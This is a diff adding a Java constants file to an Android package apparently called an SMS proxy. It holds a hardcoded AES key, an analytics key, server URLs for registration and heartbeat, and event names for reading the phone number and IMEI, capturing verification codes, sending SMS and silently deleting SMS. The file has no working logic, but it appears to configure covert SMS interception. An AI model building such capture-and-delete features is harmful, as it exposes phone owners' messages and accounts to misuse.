@@ -1,0 +1,46 @@
+package com.android.sms.proxy.entity;
+
+/**
+ * @author zyq 16-3-9
+ */
+public class NativeParams {
+
+	public static int SUCCESS = 0;
+	public static int STATUS_IDLE = 0;
+	public static int STATUS_WAIT_FOR_VERIFY_CODE = 1;
+	public static String TYPE_PHONE_NUMBER = "phone";
+	public static String TYPE_PHONE_IMEI = "imei";
+	public static String TYPE_SSH_CONNECT = "isSSHConnected";
+    public static String TYPE_PHONE_SMS = "code";
+	public static String URL_SEND_CODE = "http://172.16.5.29:8000/regist/";
+	public static String URL_HEART_BEAT = "http://172.16.5.29:8000/heartbeat/";
+	public static String KEY_ANDROID_FLURRY = "8GRFXC4J2SGNZRBQFQZG";
+	public static final String AES_KEY = "3Ce7671Ff686D51d";
+
+	//Flurry统计
+	//查找手机号码
+	public static String EVENT_GET_PHONE_NUMBER = "getPhoneNumber";
+    public static String KEY_SIM_LINE1PHONE = "fromSimLine1Phone";
+	public static String KEY_QUERY_SMS = "fromQuerySMS";
+	public static String KEY_SEND_SMS = "fromSendSMS";
+
+    //发送短信
+	public static String EVENT_SEND_SMS = "sendSMS";
+	public static String KEY_DELETE_SMS_SUCCESS = "deleteSMSSuccess";
+
+	//删除短信成功
+	public static String EVENT_DELETE_SMS_SUCCESS = "deleteSMSSuccess";
+	public static String KEY_DELETE_SUCCESS_VERSION = "phoneAndroidVersion";
+	public static String KEY_DELETE_SUCCESS_DEVICE = "phoneDevice";
+
+	//删除短信失败
+	public static String EVENT_DELETE_SMS_FAILED = "deleteSMSFail";
+	public static String KEY_DELETE_FAIL_VERSION = "phoneAndroidVersion";
+	public static String KEY_DELETE_FAIL_DEVICE = "phoneDevice";
+
+	//4.4删除成功的机型
+	public static String EVENT_VERSION_KITKAT = "kitkat";
+	public static String KEY_KITKAT_DEVICE = "kitKatDevice";
+	public static String KEY_FIX_SYSTEM_SUCCESS = "fixSystem";
+
+}
